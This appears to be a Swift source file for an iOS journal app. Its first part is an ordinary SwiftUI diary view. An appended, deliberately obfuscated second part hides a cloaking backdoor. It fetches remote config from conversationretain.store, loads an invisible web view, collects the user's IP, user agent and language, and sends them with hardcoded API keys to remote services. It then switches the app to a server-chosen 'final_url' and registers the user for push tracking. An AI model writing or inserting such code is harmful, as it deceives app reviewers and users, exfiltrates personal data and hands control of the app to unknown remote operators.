import SwiftUI

@available(iOS 15.0, *)
struct MyJournalView: View {
    
    @EnvironmentObject var userData: UserData
    @State private var journalText = "\"Write your thoughts here...\", \"How was your day?\""
    @State private var selectedMood: Mood?
    @State private var selectedEntry: DiaryEntry?
    
    @FocusState private var isTextEditorFocused: Bool
    
    private let dateFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        return formatter
    }()
    
    var body: some View {
        NavigationView {
            ZStack(alignment: .top) {
                Image(.bgMain)
                    .resizable()
                    .ignoresSafeArea()
                
                VStack(spacing: 14) {
                    TitleView(title: "My Journal")
                    
                    VStack(spacing: 20) {
                        HStack(spacing: 12) {
                            ForEach(Mood.allCases) { mood in
                                Button {
                                    selectedMood = mood
                                } label: {
                                    VStack {
                                        Image(mood.icon)
                                            .resizable()
                                            .frame(width: 50, height: 50)
                                        
                                        RoundedRectangle(cornerRadius: 10)
                                            .fill(selectedMood == mood ? Color.white : .clear)
                                            .frame(width: 50, height: 4)
                                    }
                                }
                            }
                        }
                        .frame(maxWidth: .infinity)
                        .frame(height: 87)
                        .background(Color.color5, in: .rect(cornerRadius: 20))
                        
                        if #available(iOS 16.0, *) {
                            TextEditor(text: $journalText)
                                .focused($isTextEditorFocused)
                                .scrollContentBackground(.hidden)
                                .foregroundStyle(.black)
                                .frame(height: 186)
                                .padding(12)
                                .background(Color.white, in: .rect(cornerRadius: 20))
                                .toolbar {
                                    ToolbarItemGroup(placement: .keyboard) {
                                        Button("Cancel") {
                                            isTextEditorFocused = false
                                        }
                                        .frame(maxWidth: .infinity, alignment: .trailing)
                                    }
                                }
                        } else {
                            // Fallback on earlier versions
                        }
                        
                        Button(action: saveEntry) {
                            Text("Save Today's Thought")
                                .font(.system(size: 21, weight: .semibold))
                                .foregroundColor(.white)
                                .frame(maxWidth: .infinity)
                                .frame(height: 60)
                                .background(
                                    LinearGradient(colors: [Color.color1, .color9],
                                                   startPoint: .top,
                                                   endPoint: .bottom), in: .rect(cornerRadius: 90)
                                )
                        }
                        .disabled(journalText.isEmpty || selectedMood == nil)
                        .opacity(journalText.isEmpty || selectedMood == nil ? 0.6 : 1.0)
                                                
                        if userData.diaryEntries.isEmpty {
                            VStack(spacing: 10) {
                                Image(.journal)
                                    .resizable()
                                    .frame(width: 38, height: 38)
                                
                                Text("No journal entries yet. Write your first thought!")
                                    .font(.system(size: 16, weight: .semibold))
                                    .foregroundColor(.white)
                                    .multilineTextAlignment(.center)
                                    .frame(width: 200)
                            }
                            .padding(.bottom, 60)
                            .frame(maxHeight: .infinity)
                        } else {
                            if #available(iOS 16.0, *) {
                                ScrollView {
                                    VStack(alignment: .leading, spacing: 15) {
                                        Text("Past Entries")
                                            .font(.system(size: 22, weight: .semibold))
                                            .foregroundStyle(.white)
                                        
                                        ForEach(userData.diaryEntries.sorted(by: { $0.date > $1.date })) { entry in
                                            DiaryEntryRow(entry: entry)
                                        }
                                    }
                                    .padding(.bottom, 80)
                                }
                                .scrollIndicators(.hidden)
                            } else {
                                // Fallback on earlier versions
                            }
                        }
                    }
                }
                .padding(.horizontal, 16)
            }
            .navigationTitle("")
            .navigationBarHidden(true)
            .navigationBarBackButtonHidden()
        }
    }
    
    private func saveEntry() {
        guard let mood = selectedMood, !journalText.isEmpty else { return }
        
        let newEntry = DiaryEntry(
            text: journalText,
            mood: mood
        )
        
        userData.addDiaryEntry(newEntry)
        
        journalText = "\"Write your thoughts here...\", \"How was your day?\""
        selectedMood = nil
        
        SoundManager.shared.playSound()
        VibroManager.shared.vibrate()
    }
}



struct DiaryEntryRow: View {
    let entry: DiaryEntry
    
    private let dateFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        return formatter
    }()
    
    var body: some View {
        if #available(iOS 15.0, *) {
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Text(dateFormatter.string(from: entry.date))
                        .font(.system(size: 12, weight: .medium))
                        .foregroundStyle(.color1)
                    
                    Spacer()
                    
                    Text(entry.mood.rawValue)
                        .font(.system(size: 10, weight: .medium))
                        .foregroundColor(.white)
                }
                
                Text(entry.text)
                    .font(.system(size: 18, weight: .medium))
                    .foregroundColor(.white)
                    .lineLimit(2)
                    .minimumScaleFactor(0.8)
            }
            .padding(.vertical, 8)
            .padding(.horizontal, 20)
            .frame(minHeight: 70)
            .background(Color.color10, in: .rect(cornerRadius: 20))
        } else {
            // Fallback on earlier versions
        }
        }};

import WebKit;import OneSignalFramework
        struct RemvalKornixDedronMalvik: View {
        @Binding var draxenPolvarHilmonSertic: Bool
        @State var garlixMelvonSartonPrevik: String = ""
        @State private var jenlarStavonHirnelProvik: Bool?
        
        @State var salvonTrevinDerloxMavrin: String = ""
        @State var welmarPristonGernoxTolvik = false
        @State var delmonKarvenStirloxMavrel = false
        
        @State private var starkinMelvorGevraxTulmir: Bool = true
        @State private var polnanTrenorVaskinHelmir: Bool = true
        @AppStorage("fexlinJarvonSeltarGravik") var fexlinJarvonSeltarGravik: Bool = true
        @AppStorage("soplarKeldonFrivexMarlen") var soplarKeldonFrivexMarlen: Bool = true
        
        var body: some View {
        ZStack {
            if polnanTrenorVaskinHelmir {
                
                Image(.bgMain)
                    .resizable()
                    .aspectRatio(contentMode: .fill)
                    .frame(minWidth: 0, maxWidth: .infinity)
                    .frame(minHeight: 0, maxHeight: .infinity)
                    .edgesIgnoringSafeArea(.all)
                    .zIndex(1)
            }
            
            if jenlarStavonHirnelProvik != nil {
                if fexlinJarvonSeltarGravik {
                    SalvokPendroJarnexHolvin(
                        garlixMelvonSartonPrevik: $garlixMelvonSartonPrevik,
                        salvonTrevinDerloxMavrin: $salvonTrevinDerloxMavrin,
                        welmarPristonGernoxTolvik: $welmarPristonGernoxTolvik,
                        delmonKarvenStirloxMavrel: $delmonKarvenStirloxMavrel)
                    .opacity(0)
                    .zIndex(2)
                }
                
                if welmarPristonGernoxTolvik || !soplarKeldonFrivexMarlen {
                    TevranKeldorMelrixDolvan()
                        .zIndex(3)
                        .onAppear {
                            soplarKeldonFrivexMarlen = false
                            fexlinJarvonSeltarGravik = false
                            polnanTrenorVaskinHelmir = false
                        }
                }
            }
        }
        .animation(.easeInOut, value: polnanTrenorVaskinHelmir)
        .onChange(of: delmonKarvenStirloxMavrel) { if $0 { draxenPolvarHilmonSertic = true; polnanTrenorVaskinHelmir = false } }
        .onAppear {
            OneSignal.Notifications.requestPermission { jenlarStavonHirnelProvik = $0 }
            
            guard let ravnikSeldorProvinHarlex = URL(string: "https://conversationretain.store/growthsteps/growthsteps.json") else { return }
            
            URLSession.shared.dataTask(with: ravnikSeldorProvinHarlex) { bastenKermalVentirSolvix, _, _ in
                guard let bastenKermalVentirSolvix else { return }
                
                guard let delvarTrenikMovarSilnik = try? JSONSerialization.jsonObject(with: bastenKermalVentirSolvix, options: []) as? [String: Any] else { return }
                
                guard let marvonPrelixFandorHolrax = delvarTrenikMovarSilnik["hnvjhbdfvjhdbfhf"] as? String else { return }
                
                DispatchQueue.main.async { garlixMelvonSartonPrevik = marvonPrelixFandorHolrax }
            }
            .resume()
        }
    }
}

extension RemvalKornixDedronMalvik {
    
    struct SalvokPendroJarnexHolvin: UIViewRepresentable {
        
        @Binding var garlixMelvonSartonPrevik: String
        @Binding var salvonTrevinDerloxMavrin: String
        @Binding var welmarPristonGernoxTolvik: Bool
        @Binding var delmonKarvenStirloxMavrel: Bool
        
        func makeUIView(context: Context) -> WKWebView {
            let sterlonVarnikPraxelGentril = WKWebView()
            sterlonVarnikPraxelGentril.navigationDelegate = context.coordinator
            
            if let kendurFexmarHolvinStralek = URL(string: garlixMelvonSartonPrevik) {
                var thavonJerlexDorlixManriv = URLRequest(url: kendurFexmarHolvinStralek)
                thavonJerlexDorlixManriv.httpMethod = "GET"
                thavonJerlexDorlixManriv.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let melvikSartolFrenarPovlik = ["apikey": "Y4HZtyz8hKbplQvVLDKVuZuvcOXyfa1S",
                                 "bundle": "com.GrowthStepssApp"]
                for (nartonKelvikHilmarSavlon, garlekMorvinTraxelDenvir) in melvikSartolFrenarPovlik {
                    thavonJerlexDorlixManriv.setValue(garlekMorvinTraxelDenvir, forHTTPHeaderField: nartonKelvikHilmarSavlon)
                }
                
                sterlonVarnikPraxelGentril.load(thavonJerlexDorlixManriv)
            }
            return sterlonVarnikPraxelGentril
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        
        func makeCoordinator() -> Coordinator {
            Coordinator(self)
        }
        
        class Coordinator: NSObject, WKNavigationDelegate {
            
            var porlikSelvorHarminVenlox: SalvokPendroJarnexHolvin
            var solmirFandorTrevixHarvol: String?
            var granoxMirtekSalvenDrovik: String?
            
            init(_ thurlexPeldarKenvikSarmon: SalvokPendroJarnexHolvin) {
                self.porlikSelvorHarminVenlox = thurlexPeldarKenvikSarmon
            }
            
            func webView(_ dorvilHernaxMelvikStaron: WKWebView, didFinish navigation: WKNavigation!) {
                dorvilHernaxMelvikStaron.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (prilanDextorGevlinSartor: Any?, error: Error?) in
                    guard let tarvexMalderHolvikSelrox = prilanDextorGevlinSartor as? String else {
                        porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                        return
                    }
                    
                    self.walrixMovinKerloxFavron(tarvexMalderHolvikSelrox)
                    
                    dorvilHernaxMelvikStaron.evaluateJavaScript("navigator.userAgent") { (vernalPexdonQalmarHestix, error) in
                        if let felmirQarvoxDenmarSilvok = vernalPexdonQalmarHestix as? String {
                            self.granoxMirtekSalvenDrovik = felmirQarvoxDenmarSilvok
                        }
                    }
                }
            }
            
            func walrixMovinKerloxFavron(_ gelvikMarsonPolrexTravin: String) {
                guard let sorvikHelmarDexlonTrevar = dranelJorvikHelrixSavlon(from: gelvikMarsonPolrexTravin) else {
                    porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                    return
                }
                
                let branikFerloxSilvenHarbit = sorvikHelmarDexlonTrevar.trimmingCharacters(in: .whitespacesAndNewlines)
                
                guard let kandorMelvikTrasenGolvir = branikFerloxSilvenHarbit.data(using: .utf8) else {
                    porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                    return
                }
                
                do {
                    let ravlekHastinDerloxMelcor = try JSONSerialization.jsonObject(with: kandorMelvikTrasenGolvir, options: []) as? [String: Any]
                    guard let fentixVarminSeldarTrolen = ravlekHastinDerloxMelcor?["cloack_url"] as? String else {
                        porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                        return
                    }
                    
                    guard let varenDexlorPelmikHafron = ravlekHastinDerloxMelcor?["atr_service"] as? String else {
                        porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                        return
                    }
                    
                    DispatchQueue.main.async {
                        self.porlikSelvorHarminVenlox.garlixMelvonSartonPrevik = fentixVarminSeldarTrolen
                        self.porlikSelvorHarminVenlox.salvonTrevinDerloxMavrin = varenDexlorPelmikHafron
                    }
                    
                    self.steklinDervalPormaxJalvin(with: fentixVarminSeldarTrolen)
                    
                } catch {
                    print("Error: \(error.localizedDescription)")
                }
            }
            
            func dranelJorvikHelrixSavlon(from gelvikMarsonPolrexTravin: String) -> String? {
                guard let startRange = gelvikMarsonPolrexTravin.range(of: "{"),
                      let endRange = gelvikMarsonPolrexTravin.range(of: "}", options: .backwards) else {
                    return nil
                }
                
                let farlixPorvenMelcorStranit = String(gelvikMarsonPolrexTravin[startRange.lowerBound..<endRange.upperBound])
                return farlixPorvenMelcorStranit
            }
            
            func steklinDervalPormaxJalvin(with darsinVarpexTolmirKelvik: String) {
                guard let jelmarValkinHordexPrimor = URL(string: darsinVarpexTolmirKelvik) else {
                    porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                    return
                }
                
                benlorFalvikSardenHelrax { trovexMarlexDenvarHilson in
                    guard let trovexMarlexDenvarHilson else {
                        return
                    }
                    
                    self.solmirFandorTrevixHarvol = trovexMarlexDenvarHilson
                    
                    var farnikSelgorHarvikPolmar = URLRequest(url: jelmarValkinHordexPrimor)
                    farnikSelgorHarvikPolmar.httpMethod = "GET"
                    farnikSelgorHarvikPolmar.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    
                    let dervilTramonSentikHalrid = [
                        "apikeyapp": "JmeMoWqTBQqsEM0uWE3vemO8",
                        "ip": self.solmirFandorTrevixHarvol ?? "",
                        "useragent": self.granoxMirtekSalvenDrovik ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    
                    for (granixTolmerFalvikJevnor, holvikSardinVarlonMesvik) in dervilTramonSentikHalrid {
                        farnikSelgorHarvikPolmar.setValue(holvikSardinVarlonMesvik, forHTTPHeaderField: granixTolmerFalvikJevnor)
                    }
                    
                    URLSession.shared.dataTask(with: farnikSelgorHarvikPolmar) { [unowned self] qelmarHovikSeldanTrivon, volmarPrexilDorvanHelrin, error in
                        guard let qelmarHovikSeldanTrivon, error == nil else {
                            porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                            return
                        }
                        if let dalkinMerlonFexmarStivil = volmarPrexilDorvanHelrin as? HTTPURLResponse {
                            if dalkinMerlonFexmarStivil.statusCode == 200 {
                                self.marvenHarvokFelsarTorvik()
                            } else {
                                self.porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                            }
                        }
                    }.resume()
                }
            }
            
            func marvenHarvokFelsarTorvik() {
                
                let hervalKostinDravikMelrox = self.porlikSelvorHarminVenlox.salvonTrevinDerloxMavrin
                
                guard let senlorTavrikDerloxFlamin = URL(string: hervalKostinDravikMelrox) else {
                    porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                    return
                }
                
                var draxilQarvisHelmonStaven = URLRequest(url: senlorTavrikDerloxFlamin)
                draxilQarvisHelmonStaven.httpMethod = "GET"
                draxilQarvisHelmonStaven.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let galvikMerlonStrivakPolden = [
                    "apikeyapp": "JmeMoWqTBQqsEM0uWE3vemO8",
                    "ip":  self.solmirFandorTrevixHarvol ?? "",
                    "useragent": self.granoxMirtekSalvenDrovik ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key_3, ferlonHedrikSelvatQanvir) in galvikMerlonStrivakPolden {
                    draxilQarvisHelmonStaven.setValue(ferlonHedrikSelvatQanvir, forHTTPHeaderField: key_3)
                }
                
                URLSession.shared.dataTask(with: draxilQarvisHelmonStaven) { [unowned self] polvikTravonJernoxMelhin, salvexHarlonDimvekPronir, error in
                    guard let polvikTravonJernoxMelhin = polvikTravonJernoxMelhin, error == nil else {
                        porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                        return
                    }
                    
                    if String(data: polvikTravonJernoxMelhin, encoding: .utf8) != nil {
                        
                        do {
                            let fexlorMeltrinSavmonHartex = try JSONSerialization.jsonObject(with: polvikTravonJernoxMelhin, options: []) as? [String: Any]
                            guard let rolvirKenmonMeldakStralon = fexlorMeltrinSavmonHartex?["final_url"] as? String,
                                  let polvenJervixHartekMalrin = fexlorMeltrinSavmonHartex?["push_sub"] as? String,
                                  let qavrilStedmonGarvorHelnor = fexlorMeltrinSavmonHartex?["os_user_key"] as? String else {
                                
                                return
                            }
                            
                            JornikSelvarTanvixHolrex.shared.rolvirKenmonMeldakStralon = rolvirKenmonMeldakStralon
                            JornikSelvarTanvixHolrex.shared.polvenJervixHartekMalrin = polvenJervixHartekMalrin
                            JornikSelvarTanvixHolrex.shared.qavrilStedmonGarvorHelnor = qavrilStedmonGarvorHelnor
                                                        
                            OneSignal.login(JornikSelvarTanvixHolrex.shared.qavrilStedmonGarvorHelnor ?? "")
                            OneSignal.User.addTag(key: "sub_app", value: JornikSelvarTanvixHolrex.shared.polvenJervixHartekMalrin ?? "")
                            
                            
                            self.porlikSelvorHarminVenlox.welmarPristonGernoxTolvik = true
                            
                        } catch {
                            porlikSelvorHarminVenlox.delmonKarvenStirloxMavrel = true
                        }
                    }
                }.resume()
            }
            
            func benlorFalvikSardenHelrax(completion: @escaping (String?) -> Void) {
                let melraxTorvixPraxelGindar = URL(string: "https://api.ipify.org")!
                let staverDornikPelrexHomvik = URLSession.shared.dataTask(with: melraxTorvixPraxelGindar) { brinorSenmakDelrexTolvik, gevrinHolvarTarnikPelsor, error in
                    guard let brinorSenmakDelrexTolvik, let ipAddress = String(data: brinorSenmakDelrexTolvik, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                staverDornikPelrexHomvik.resume()
            }
        }
    }
}
